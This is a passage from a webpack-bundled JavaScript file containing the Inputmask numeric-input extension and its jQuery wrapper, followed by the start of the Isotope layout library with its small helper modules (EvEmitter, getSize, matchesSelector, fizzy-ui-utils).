                    parseMinMaxOptions(opts);
                    if (opts.min !== null || opts.max !== null) {
                      unmasked = opts.onUnMask(buffer.join(""), undefined, $.extend({}, opts, {
                        unmaskAsNumber: true
                      }));
                      if (opts.min !== null && unmasked < opts.min) {
                        opts.isNegative = opts.min < 0;
                        return opts.postValidation(opts.min.toString().replace(".", opts.radixPoint).split(""), caretPos, {
                          caret: caretPos,
                          dopost: true,
                          placeholder: "0"
                        }, opts);
                      } else if (opts.max !== null && unmasked > opts.max) {
                        opts.isNegative = opts.max < 0;
                        return opts.postValidation(opts.max.toString().replace(".", opts.radixPoint).split(""), caretPos, {
                          caret: caretPos,
                          dopost: true,
                          placeholder: "0"
                        }, opts);
                      }
                    }
                    return opts.postValidation(buffer, caretPos, {
                      caret: caretPos,
                      placeholder: "0",
                      event: "blur"
                    }, opts);
                  case "_checkval":
                    return {
                      caret: caretPos
                    };
                  default:
                    break;
                }
              }
            },
            regex: {
              integerPart: function integerPart(opts, emptyCheck) {
                return emptyCheck ? new RegExp("[" + Inputmask.escapeRegex(opts.negationSymbol.front) + "+]?") : new RegExp("[" + Inputmask.escapeRegex(opts.negationSymbol.front) + "+]?\\d+");
              },
              integerNPart: function integerNPart(opts) {
                return new RegExp("[\\d" + Inputmask.escapeRegex(opts.groupSeparator) + Inputmask.escapeRegex(opts.placeholder.charAt(0)) + "]+");
              }
            },
            definitions: {
              "~": {
                validator: function validator(chrs, maskset, pos, strict, opts, isSelection) {
                  var isValid, l;
                  if (chrs === "k" || chrs === "m") {
                    isValid = {
                      insert: [],
                      c: 0
                    };
                    for (var i = 0, l = chrs === "k" ? 2 : 5; i < l; i++) {
                      isValid.insert.push({
                        pos: pos + i,
                        c: 0
                      });
                    }
                    isValid.pos = pos + l;
                    return isValid;
                  }
                  isValid = strict ? new RegExp("[0-9" + Inputmask.escapeRegex(opts.groupSeparator) + "]").test(chrs) : new RegExp("[0-9]").test(chrs);
                  if (isValid === true) {
                    if (opts.numericInput !== true && maskset.validPositions[pos] !== undefined && maskset.validPositions[pos].match.def === "~" && !isSelection) {
                      var processValue = maskset.buffer.join("");
                      processValue = processValue.replace(new RegExp("[-" + Inputmask.escapeRegex(opts.negationSymbol.front) + "]", "g"), "");
                      processValue = processValue.replace(new RegExp(Inputmask.escapeRegex(opts.negationSymbol.back) + "$"), "");
                      var pvRadixSplit = processValue.split(opts.radixPoint);
                      if (pvRadixSplit.length > 1) {
                        pvRadixSplit[1] = pvRadixSplit[1].replace(/0/g, opts.placeholder.charAt(0));
                      }
                      if (pvRadixSplit[0] === "0") {
                        pvRadixSplit[0] = pvRadixSplit[0].replace(/0/g, opts.placeholder.charAt(0));
                      }
                      processValue = pvRadixSplit[0] + opts.radixPoint + pvRadixSplit[1] || "";
                      var bufferTemplate = maskset._buffer.join("");
                      if (processValue === opts.radixPoint) {
                        processValue = bufferTemplate;
                      }
                      while (processValue.match(Inputmask.escapeRegex(bufferTemplate) + "$") === null) {
                        bufferTemplate = bufferTemplate.slice(1);
                      }
                      processValue = processValue.replace(bufferTemplate, "");
                      processValue = processValue.split("");
                      if (processValue[pos] === undefined) {
                        isValid = {
                          pos: pos,
                          remove: pos
                        };
                      } else {
                        isValid = {
                          pos: pos
                        };
                      }
                    }
                  } else if (!strict && chrs === opts.radixPoint && maskset.validPositions[pos - 1] === undefined) {
                    isValid = {
                      insert: {
                        pos: pos,
                        c: 0
                      },
                      pos: pos + 1
                    };
                  }
                  return isValid;
                },
                cardinality: 1
              },
              "+": {
                validator: function validator(chrs, maskset, pos, strict, opts) {
                  return opts.allowMinus && (chrs === "-" || chrs === opts.negationSymbol.front);
                },
                cardinality: 1,
                placeholder: ""
              },
              "-": {
                validator: function validator(chrs, maskset, pos, strict, opts) {
                  return opts.allowMinus && chrs === opts.negationSymbol.back;
                },
                cardinality: 1,
                placeholder: ""
              },
              ":": {
                validator: function validator(chrs, maskset, pos, strict, opts) {
                  var radix = "[" + Inputmask.escapeRegex(opts.radixPoint) + "]";
                  var isValid = new RegExp(radix).test(chrs);
                  if (isValid && maskset.validPositions[pos] && maskset.validPositions[pos].match.placeholder === opts.radixPoint) {
                    isValid = {
                      caret: pos + 1
                    };
                  }
                  return isValid;
                },
                cardinality: 1,
                placeholder: function placeholder(opts) {
                  return opts.radixPoint;
                }
              }
            },
            onUnMask: function onUnMask(maskedValue, unmaskedValue, opts) {
              if (unmaskedValue === "" && opts.nullable === true) {
                return unmaskedValue;
              }
              var processValue = maskedValue.replace(opts.prefix, "");
              processValue = processValue.replace(opts.suffix, "");
              processValue = processValue.replace(new RegExp(Inputmask.escapeRegex(opts.groupSeparator), "g"), "");
              if (opts.placeholder.charAt(0) !== "") {
                processValue = processValue.replace(new RegExp(opts.placeholder.charAt(0), "g"), "0");
              }
              if (opts.unmaskAsNumber) {
                if (opts.radixPoint !== "" && processValue.indexOf(opts.radixPoint) !== -1) processValue = processValue.replace(Inputmask.escapeRegex.call(this, opts.radixPoint), ".");
                processValue = processValue.replace(new RegExp("^" + Inputmask.escapeRegex(opts.negationSymbol.front)), "-");
                processValue = processValue.replace(new RegExp(Inputmask.escapeRegex(opts.negationSymbol.back) + "$"), "");
                return Number(processValue);
              }
              return processValue;
            },
            isComplete: function isComplete(buffer, opts) {
              var maskedValue = (opts.numericInput ? buffer.slice().reverse() : buffer).join("");
              maskedValue = maskedValue.replace(new RegExp("^" + Inputmask.escapeRegex(opts.negationSymbol.front)), "-");
              maskedValue = maskedValue.replace(new RegExp(Inputmask.escapeRegex(opts.negationSymbol.back) + "$"), "");
              maskedValue = maskedValue.replace(opts.prefix, "");
              maskedValue = maskedValue.replace(opts.suffix, "");
              maskedValue = maskedValue.replace(new RegExp(Inputmask.escapeRegex(opts.groupSeparator) + "([0-9]{3})", "g"), "$1");
              if (opts.radixPoint === ",") maskedValue = maskedValue.replace(Inputmask.escapeRegex(opts.radixPoint), ".");
              return isFinite(maskedValue);
            },
            onBeforeMask: function onBeforeMask(initialValue, opts) {
              opts.isNegative = undefined;
              if (typeof initialValue == "number" && opts.radixPoint !== "") {
                initialValue = initialValue.toString().replace(".", opts.radixPoint);
              }
              initialValue = initialValue.toString().charAt(initialValue.length - 1) === opts.radixPoint ? initialValue.toString().substr(0, initialValue.length - 1) : initialValue.toString();
              if (opts.radixPoint !== "" && isFinite(initialValue)) {
                var vs = initialValue.split("."),
                  groupSize = opts.groupSeparator !== "" ? parseInt(opts.groupSize) : 0;
                if (vs.length === 2 && (vs[0].length > groupSize || vs[1].length > groupSize || vs[0].length <= groupSize && vs[1].length < groupSize)) {
                  initialValue = initialValue.replace(".", opts.radixPoint);
                }
              }
              var kommaMatches = initialValue.match(/,/g);
              var dotMatches = initialValue.match(/\./g);
              if (dotMatches && kommaMatches) {
                if (dotMatches.length > kommaMatches.length) {
                  initialValue = initialValue.replace(/\./g, "");
                  initialValue = initialValue.replace(",", opts.radixPoint);
                } else if (kommaMatches.length > dotMatches.length) {
                  initialValue = initialValue.replace(/,/g, "");
                  initialValue = initialValue.replace(".", opts.radixPoint);
                } else {
                  initialValue = initialValue.indexOf(".") < initialValue.indexOf(",") ? initialValue.replace(/\./g, "") : initialValue.replace(/,/g, "");
                }
              } else {
                initialValue = initialValue.replace(new RegExp(Inputmask.escapeRegex(opts.groupSeparator), "g"), "");
              }
              if (opts.digits === 0) {
                if (initialValue.indexOf(".") !== -1) {
                  initialValue = initialValue.substring(0, initialValue.indexOf("."));
                } else if (initialValue.indexOf(",") !== -1) {
                  initialValue = initialValue.substring(0, initialValue.indexOf(","));
                }
              }
              if (opts.radixPoint !== "" && isFinite(opts.digits)) {
                if (initialValue.indexOf(opts.radixPoint) !== -1) {
                  var valueParts = initialValue.split(opts.radixPoint),
                    decPart = valueParts[1].match(new RegExp("\\d*"))[0];
                  if (parseInt(opts.digits) < decPart.toString().length) {
                    var digitsFactor = Math.pow(10, parseInt(opts.digits));
                    initialValue = initialValue.replace(Inputmask.escapeRegex(opts.radixPoint), ".");
                    initialValue = Math.round(parseFloat(initialValue) * digitsFactor) / digitsFactor;
                    initialValue = initialValue.toString().replace(".", opts.radixPoint);
                  }
                }
              }
              return alignDigits(initialValue.toString().split(""), opts).join("");
            },
            onKeyDown: function onKeyDown(e, buffer, caretPos, opts) {
              var $input = $(this);
              if (e.ctrlKey) {
                switch (e.keyCode) {
                  case Inputmask.keyCode.UP:
                    $input.val(parseFloat(this.inputmask.unmaskedvalue()) + parseInt(opts.step));
                    $input.trigger("setvalue");
                    break;
                  case Inputmask.keyCode.DOWN:
                    $input.val(parseFloat(this.inputmask.unmaskedvalue()) - parseInt(opts.step));
                    $input.trigger("setvalue");
                    break;
                }
              }
            }
          },
          currency: {
            prefix: "$ ",
            groupSeparator: ",",
            alias: "numeric",
            placeholder: "0",
            autoGroup: true,
            digits: 2,
            digitsOptional: false,
            clearMaskOnLostFocus: false
          },
          decimal: {
            alias: "numeric"
          },
          integer: {
            alias: "numeric",
            digits: 0,
            radixPoint: ""
          },
          percentage: {
            alias: "numeric",
            digits: 2,
            digitsOptional: true,
            radixPoint: ".",
            placeholder: "0",
            autoGroup: false,
            min: 0,
            max: 100,
            suffix: " %",
            allowMinus: false
          }
        });
        return Inputmask;
      });
    }, function (module, exports, __webpack_require__) {
      "use strict";

      var __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;
      var _typeof = typeof Symbol === "function" && _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(Symbol.iterator) === "symbol" ? function (obj) {
        return _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      } : function (obj) {
        return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      };
      (function (factory) {
        if (true) {
          !(__WEBPACK_AMD_DEFINE_ARRAY__ = [__webpack_require__(4), __webpack_require__(2)], __WEBPACK_AMD_DEFINE_FACTORY__ = factory, __WEBPACK_AMD_DEFINE_RESULT__ = typeof __WEBPACK_AMD_DEFINE_FACTORY__ === "function" ? __WEBPACK_AMD_DEFINE_FACTORY__.apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__) : __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
        } else {}
      })(function ($, Inputmask) {
        if ($.fn.inputmask === undefined) {
          $.fn.inputmask = function (fn, options) {
            var nptmask,
              input = this[0];
            if (options === undefined) options = {};
            if (typeof fn === "string") {
              switch (fn) {
                case "unmaskedvalue":
                  return input && input.inputmask ? input.inputmask.unmaskedvalue() : $(input).val();
                case "remove":
                  return this.each(function () {
                    if (this.inputmask) this.inputmask.remove();
                  });
                case "getemptymask":
                  return input && input.inputmask ? input.inputmask.getemptymask() : "";
                case "hasMaskedValue":
                  return input && input.inputmask ? input.inputmask.hasMaskedValue() : false;
                case "isComplete":
                  return input && input.inputmask ? input.inputmask.isComplete() : true;
                case "getmetadata":
                  return input && input.inputmask ? input.inputmask.getmetadata() : undefined;
                case "setvalue":
                  Inputmask.setValue(input, options);
                  break;
                case "option":
                  if (typeof options === "string") {
                    if (input && input.inputmask !== undefined) {
                      return input.inputmask.option(options);
                    }
                  } else {
                    return this.each(function () {
                      if (this.inputmask !== undefined) {
                        return this.inputmask.option(options);
                      }
                    });
                  }
                  break;
                default:
                  options.alias = fn;
                  nptmask = new Inputmask(options);
                  return this.each(function () {
                    nptmask.mask(this);
                  });
              }
            } else if (Array.isArray(fn)) {
              options.alias = fn;
              nptmask = new Inputmask(options);
              return this.each(function () {
                nptmask.mask(this);
              });
            } else if ((typeof fn === "undefined" ? "undefined" : _typeof(fn)) == "object") {
              nptmask = new Inputmask(fn);
              if (fn.mask === undefined && fn.alias === undefined) {
                return this.each(function () {
                  if (this.inputmask !== undefined) {
                    return this.inputmask.option(fn);
                  } else nptmask.mask(this);
                });
              } else {
                return this.each(function () {
                  nptmask.mask(this);
                });
              }
            } else if (fn === undefined) {
              return this.each(function () {
                nptmask = new Inputmask(options);
                nptmask.mask(this);
              });
            }
          };
        }
        return $.fn.inputmask;
      });
    }]);

    /***/
  }),
  /***/"./src/js/_vendor/_isotope.pkgd.js": (
  /*!*****************************************!*\
    !*** ./src/js/_vendor/_isotope.pkgd.js ***!
    \*****************************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* WEBPACK VAR INJECTION */
    (function (module) {
      /* harmony import */var _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @babel/runtime/helpers/typeof */"./node_modules/@babel/runtime/helpers/typeof.js");
      /* harmony import */
      var _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0__);

      /*!
       * Isotope PACKAGED v3.0.6
       *
       * Licensed GPLv3 for open source use
       * or Isotope Commercial License for commercial use
       *
       * https://isotope.metafizzy.co
       * Copyright 2010-2018 Metafizzy
       */

      /**
       * Bridget makes jQuery widgets
       * v2.0.1
       * MIT license
       */

      /* jshint browser: true, strict: true, undef: true, unused: true */

      (function (window, factory) {
        // universal module definition
        /*jshint strict: false */ /* globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('jquery-bridget/jquery-bridget', ['jquery'], function (jQuery) {
            return factory(window, jQuery);
          });
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(window, __webpack_require__(/*! jquery */"jquery"));
        } else {
          // browser global
          window.jQueryBridget = factory(window, window.jQuery);
        }
      })(window, function factory(window, jQuery) {
        'use strict';

        // ----- utils ----- //
        var arraySlice = Array.prototype.slice;

        // helper function for logging errors
        // $.error breaks jQuery chaining
        var console = window.console;
        var logError = typeof console == 'undefined' ? function () {} : function (message) {
          console.error(message);
        };

        // ----- jQueryBridget ----- //

        function jQueryBridget(namespace, PluginClass, $) {
          $ = $ || jQuery || window.jQuery;
          if (!$) {
            return;
          }

          // add option method -> $().plugin('option', {...})
          if (!PluginClass.prototype.option) {
            // option setter
            PluginClass.prototype.option = function (opts) {
              // bail out if not an object
              if (!$.isPlainObject(opts)) {
                return;
              }
              this.options = $.extend(true, this.options, opts);
            };
          }

          // make jQuery plugin
          $.fn[namespace] = function (arg0 /*, arg1 */) {
            if (typeof arg0 == 'string') {
              // method call $().plugin( 'methodName', { options } )
              // shift arguments by 1
              var args = arraySlice.call(arguments, 1);
              return methodCall(this, arg0, args);
            }
            // just $().plugin({ options })
            plainCall(this, arg0);
            return this;
          };

          // $().plugin('methodName')
          function methodCall($elems, methodName, args) {
            var returnValue;
            var pluginMethodStr = '$().' + namespace + '("' + methodName + '")';
            $elems.each(function (i, elem) {
              // get instance
              var instance = $.data(elem, namespace);
              if (!instance) {
                logError(namespace + ' not initialized. Cannot call methods, i.e. ' + pluginMethodStr);
                return;
              }
              var method = instance[methodName];
              if (!method || methodName.charAt(0) == '_') {
                logError(pluginMethodStr + ' is not a valid method');
                return;
              }

              // apply method, get return value
              var value = method.apply(instance, args);
              // set return value if value is returned, use only first value
              returnValue = returnValue === undefined ? value : returnValue;
            });
            return returnValue !== undefined ? returnValue : $elems;
          }
          function plainCall($elems, options) {
            $elems.each(function (i, elem) {
              var instance = $.data(elem, namespace);
              if (instance) {
                // set options & init
                instance.option(options);
                instance._init();
              } else {
                // initialize new instance
                instance = new PluginClass(elem, options);
                $.data(elem, namespace, instance);
              }
            });
          }
          updateJQuery($);
        }

        // ----- updateJQuery ----- //

        // set $.bridget for v1 backwards compatibility
        function updateJQuery($) {
          if (!$ || $ && $.bridget) {
            return;
          }
          $.bridget = jQueryBridget;
        }
        updateJQuery(jQuery || window.jQuery);

        // -----  ----- //

        return jQueryBridget;
      });

      /**
       * EvEmitter v1.1.0
       * Lil' event emitter
       * MIT License
       */

      /* jshint unused: true, undef: true, strict: true */

      (function (global, factory) {
        // universal module definition
        /* jshint strict: false */ /* globals define, module, window */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD - RequireJS
          define('ev-emitter/ev-emitter', factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS - Browserify, Webpack
          module.exports = factory();
        } else {
          // Browser globals
          global.EvEmitter = factory();
        }
      })(typeof window != 'undefined' ? window : undefined, function () {
        function EvEmitter() {}
        var proto = EvEmitter.prototype;
        proto.on = function (eventName, listener) {
          if (!eventName || !listener) {
            return;
          }
          // set events hash
          var events = this._events = this._events || {};
          // set listeners array
          var listeners = events[eventName] = events[eventName] || [];
          // only add once
          if (listeners.indexOf(listener) == -1) {
            listeners.push(listener);
          }
          return this;
        };
        proto.once = function (eventName, listener) {
          if (!eventName || !listener) {
            return;
          }
          // add event
          this.on(eventName, listener);
          // set once flag
          // set onceEvents hash
          var onceEvents = this._onceEvents = this._onceEvents || {};
          // set onceListeners object
          var onceListeners = onceEvents[eventName] = onceEvents[eventName] || {};
          // set flag
          onceListeners[listener] = true;
          return this;
        };
        proto.off = function (eventName, listener) {
          var listeners = this._events && this._events[eventName];
          if (!listeners || !listeners.length) {
            return;
          }
          var index = listeners.indexOf(listener);
          if (index != -1) {
            listeners.splice(index, 1);
          }
          return this;
        };
        proto.emitEvent = function (eventName, args) {
          var listeners = this._events && this._events[eventName];
          if (!listeners || !listeners.length) {
            return;
          }
          // copy over to avoid interference if .off() in listener
          listeners = listeners.slice(0);
          args = args || [];
          // once stuff
          var onceListeners = this._onceEvents && this._onceEvents[eventName];
          for (var i = 0; i < listeners.length; i++) {
            var listener = listeners[i];
            var isOnce = onceListeners && onceListeners[listener];
            if (isOnce) {
              // remove listener
              // remove before trigger to prevent recursion
              this.off(eventName, listener);
              // unset once flag
              delete onceListeners[listener];
            }
            // trigger listener
            listener.apply(this, args);
          }
          return this;
        };
        proto.allOff = function () {
          delete this._events;
          delete this._onceEvents;
        };
        return EvEmitter;
      });

      /*!
       * getSize v2.0.3
       * measure size of elements
       * MIT license
       */

      /* jshint browser: true, strict: true, undef: true, unused: true */
      /* globals console: false */

      (function (window, factory) {
        /* jshint strict: false */ /* globals define, module */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('get-size/get-size', factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory();
        } else {
          // browser global
          window.getSize = factory();
        }
      })(window, function factory() {
        'use strict';

        // -------------------------- helpers -------------------------- //

        // get a number from a string, not a percentage
        function getStyleSize(value) {
          var num = parseFloat(value);
          // not a percent like '100%', and a number
          var isValid = value.indexOf('%') == -1 && !isNaN(num);
          return isValid && num;
        }
        function noop() {}
        var logError = typeof console == 'undefined' ? noop : function (message) {
          console.error(message);
        };

        // -------------------------- measurements -------------------------- //

        var measurements = ['paddingLeft', 'paddingRight', 'paddingTop', 'paddingBottom', 'marginLeft', 'marginRight', 'marginTop', 'marginBottom', 'borderLeftWidth', 'borderRightWidth', 'borderTopWidth', 'borderBottomWidth'];
        var measurementsLength = measurements.length;
        function getZeroSize() {
          var size = {
            width: 0,
            height: 0,
            innerWidth: 0,
            innerHeight: 0,
            outerWidth: 0,
            outerHeight: 0
          };
          for (var i = 0; i < measurementsLength; i++) {
            var measurement = measurements[i];
            size[measurement] = 0;
          }
          return size;
        }

        // -------------------------- getStyle -------------------------- //

        /**
         * getStyle, get style of element, check for Firefox bug
         * https://bugzilla.mozilla.org/show_bug.cgi?id=548397
         */
        function getStyle(elem) {
          var style = getComputedStyle(elem);
          if (!style) {
            logError('Style returned ' + style + '. Are you running this code in a hidden iframe on Firefox? ' + 'See https://bit.ly/getsizebug1');
          }
          return style;
        }

        // -------------------------- setup -------------------------- //

        var isSetup = false;
        var isBoxSizeOuter;

        /**
         * setup
         * check isBoxSizerOuter
         * do on first getSize() rather than on page load for Firefox bug
         */
        function setup() {
          // setup once
          if (isSetup) {
            return;
          }
          isSetup = true;

          // -------------------------- box sizing -------------------------- //

          /**
           * Chrome & Safari measure the outer-width on style.width on border-box elems
           * IE11 & Firefox<29 measures the inner-width
           */
          var div = document.createElement('div');
          div.style.width = '200px';
          div.style.padding = '1px 2px 3px 4px';
          div.style.borderStyle = 'solid';
          div.style.borderWidth = '1px 2px 3px 4px';
          div.style.boxSizing = 'border-box';
          var body = document.body || document.documentElement;
          body.appendChild(div);
          var style = getStyle(div);
          // round value for browser zoom. desandro/masonry#928
          isBoxSizeOuter = Math.round(getStyleSize(style.width)) == 200;
          getSize.isBoxSizeOuter = isBoxSizeOuter;
          body.removeChild(div);
        }

        // -------------------------- getSize -------------------------- //

        function getSize(elem) {
          setup();

          // use querySeletor if elem is string
          if (typeof elem == 'string') {
            elem = document.querySelector(elem);
          }

          // do not proceed on non-objects
          if (!elem || _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(elem) != 'object' || !elem.nodeType) {
            return;
          }
          var style = getStyle(elem);

          // if hidden, everything is 0
          if (style.display == 'none') {
            return getZeroSize();
          }
          var size = {};
          size.width = elem.offsetWidth;
          size.height = elem.offsetHeight;
          var isBorderBox = size.isBorderBox = style.boxSizing == 'border-box';

          // get all measurements
          for (var i = 0; i < measurementsLength; i++) {
            var measurement = measurements[i];
            var value = style[measurement];
            var num = parseFloat(value);
            // any 'auto', 'medium' value will be 0
            size[measurement] = !isNaN(num) ? num : 0;
          }
          var paddingWidth = size.paddingLeft + size.paddingRight;
          var paddingHeight = size.paddingTop + size.paddingBottom;
          var marginWidth = size.marginLeft + size.marginRight;
          var marginHeight = size.marginTop + size.marginBottom;
          var borderWidth = size.borderLeftWidth + size.borderRightWidth;
          var borderHeight = size.borderTopWidth + size.borderBottomWidth;
          var isBorderBoxSizeOuter = isBorderBox && isBoxSizeOuter;

          // overwrite width and height if we can get it from style
          var styleWidth = getStyleSize(style.width);
          if (styleWidth !== false) {
            size.width = styleWidth + (
            // add padding and border unless it's already including it
            isBorderBoxSizeOuter ? 0 : paddingWidth + borderWidth);
          }
          var styleHeight = getStyleSize(style.height);
          if (styleHeight !== false) {
            size.height = styleHeight + (
            // add padding and border unless it's already including it
            isBorderBoxSizeOuter ? 0 : paddingHeight + borderHeight);
          }
          size.innerWidth = size.width - (paddingWidth + borderWidth);
          size.innerHeight = size.height - (paddingHeight + borderHeight);
          size.outerWidth = size.width + marginWidth;
          size.outerHeight = size.height + marginHeight;
          return size;
        }
        return getSize;
      });

      /**
       * matchesSelector v2.0.2
       * matchesSelector( element, '.selector' )
       * MIT license
       */

      /*jshint browser: true, strict: true, undef: true, unused: true */

      (function (window, factory) {
        /*global define: false, module: false */
        'use strict';

        // universal module definition
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('desandro-matches-selector/matches-selector', factory);
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory();
        } else {
          // browser global
          window.matchesSelector = factory();
        }
      })(window, function factory() {
        'use strict';

        var matchesMethod = function () {
          var ElemProto = window.Element.prototype;
          // check for the standard method name first
          if (ElemProto.matches) {
            return 'matches';
          }
          // check un-prefixed
          if (ElemProto.matchesSelector) {
            return 'matchesSelector';
          }
          // check vendor prefixes
          var prefixes = ['webkit', 'moz', 'ms', 'o'];
          for (var i = 0; i < prefixes.length; i++) {
            var prefix = prefixes[i];
            var method = prefix + 'MatchesSelector';
            if (ElemProto[method]) {
              return method;
            }
          }
        }();
        return function matchesSelector(elem, selector) {
          return elem[matchesMethod](selector);
        };
      });

      /**
       * Fizzy UI utils v2.0.7
       * MIT license
       */

      /*jshint browser: true, undef: true, unused: true, strict: true */

      (function (window, factory) {
        // universal module definition
        /*jshint strict: false */ /*globals define, module, require */

        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD
          define('fizzy-ui-utils/utils', ['desandro-matches-selector/matches-selector'], function (matchesSelector) {
            return factory(window, matchesSelector);
          });
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS
          module.exports = factory(window, __webpack_require__(/*! desandro-matches-selector */"./node_modules/desandro-matches-selector/matches-selector.js"));
        } else {
          // browser global
          window.fizzyUIUtils = factory(window, window.matchesSelector);
        }
      })(window, function factory(window, matchesSelector) {
        var utils = {};

        // ----- extend ----- //

        // extends objects
        utils.extend = function (a, b) {
          for (var prop in b) {
            a[prop] = b[prop];
          }
          return a;
        };

        // ----- modulo ----- //

        utils.modulo = function (num, div) {
          return (num % div + div) % div;
        };

        // ----- makeArray ----- //

        var arraySlice = Array.prototype.slice;

        // turn element or nodeList into an array
        utils.makeArray = function (obj) {
          if (Array.isArray(obj)) {
            // use object if already an array
            return obj;
          }
          // return empty array if undefined or null. #6
          if (obj === null || obj === undefined) {
            return [];
          }
          var isArrayLike = _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj) == 'object' && typeof obj.length == 'number';
          if (isArrayLike) {
            // convert nodeList to array
            return arraySlice.call(obj);
          }

          // array of single index
          return [obj];
        };

        // ----- removeFrom ----- //

        utils.removeFrom = function (ary, obj) {
          var index = ary.indexOf(obj);
          if (index != -1) {
            ary.splice(index, 1);
          }
        };

        // ----- getParent ----- //

        utils.getParent = function (elem, selector) {
          while (elem.parentNode && elem != document.body) {
            elem = elem.parentNode;
            if (matchesSelector(elem, selector)) {
              return elem;
            }
          }
        };

        // ----- getQueryElement ----- //

        // use element as selector string
        utils.getQueryElement = function (elem) {
          if (typeof elem == 'string') {
            return document.querySelector(elem);
          }
          return elem;
        };

        // ----- handleEvent ----- //

        // enable .ontype to trigger from .addEventListener( elem, 'type' )
        utils.handleEvent = function (event) {
          var method = 'on' + event.type;
          if (this[method]) {
            this[method](event);
          }
        };

        // ----- filterFindElements ----- //

        utils.filterFindElements = function (elems, selector) {
          // make array of elems
          elems = utils.makeArray(elems);
          var ffElems = [];
          elems.forEach(function (elem) {
            // check that elem is an actual element
            if (!(elem instanceof HTMLElement)) {
              return;
            }
            // add elem if no selector
            if (!selector) {
              ffElems.push(elem);
              return;
            }
            // filter & find items if we have a selector
            // filter
            if (matchesSelector(elem, selector)) {
              ffElems.push(elem);
            }
            // find children
            var childElems = elem.querySelectorAll(selector);
            // concat childElems to filterFound array
            for (var i = 0; i < childElems.length; i++) {
              ffElems.push(childElems[i]);
            }
          });
          return ffElems;
        };

        // ----- debounceMethod ----- //

        utils.debounceMethod = function (_class, methodName, threshold) {
          threshold = threshold || 100;
          // original method
          var method = _class.prototype[methodName];
          var timeoutName = methodName + 'Timeout';
          _class.prototype[methodName] = function () {
            var timeout = this[timeoutName];
            clearTimeout(timeout);
            var args = arguments;
            var _this = this;
            this[timeoutName] = setTimeout(function () {
              method.apply(_this, args);
              delete _this[timeoutName];
            }, threshold);
          };
        };

        // ----- docReady ----- //

        utils.docReady = function (callback) {
          var readyState = document.readyState;
          if (readyState == 'complete' || readyState == 'interactive') {
            // do async to allow for other scripts to run. metafizzy/flickity#441
            setTimeout(callback);
          } else {
            document.addEventListener('DOMContentLoaded', callback);
          }
        };

        // ----- htmlInit ----- //

        // http://jamesroberts.name/blog/2010/02/22/string-functions-for-javascript-trim-to-camel-case-to-dashed-and-to-underscore/
        utils.toDashed = function (str) {
          return str.replace(/(.)([A-Z])/g, function (match, $1, $2) {
            return $1 + '-' + $2;
          }).toLowerCase();
        };
        var console = window.console;
        /**
         * allow user to initialize classes via [data-namespace] or .js-namespace class
         * htmlInit( Widget, 'widgetName' )
         * options are parsed from data-namespace-options
         */
        utils.htmlInit = function (WidgetClass, namespace) {
          utils.docReady(function () {
            var dashedNamespace = utils.toDashed(namespace);
            var dataAttr = 'data-' + dashedNamespace;
            var dataAttrElems = document.querySelectorAll('[' + dataAttr + ']');
            var jsDashElems = document.querySelectorAll('.js-' + dashedNamespace);
            var elems = utils.makeArray(dataAttrElems).concat(utils.makeArray(jsDashElems));
            var dataOptionsAttr = dataAttr + '-options';
            var jQuery = window.jQuery;
            elems.forEach(function (elem) {
              var attr = elem.getAttribute(dataAttr) || elem.getAttribute(dataOptionsAttr);
              var options;
              try {
                options = attr && JSON.parse(attr);
              } catch (error) {
                // log error, do not initialize
                if (console) {
                  console.error('Error parsing ' + dataAttr + ' on ' + elem.className + ': ' + error);
                }
                return;
              }
              // initialize
              var instance = new WidgetClass(elem, options);
              // make available via $().data('namespace')
              if (jQuery) {
                jQuery.data(elem, namespace, instance);
              }
            });
          });
        };

        // -----  ----- //

        return utils;
      });

      /**
       * Outlayer Item
       */

      (function (window, factory) {
        // universal module definition
        /* jshint strict: false */ /* globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD - RequireJS
          define('outlayer/item', ['ev-emitter/ev-emitter', 'get-size/get-size'], factory);
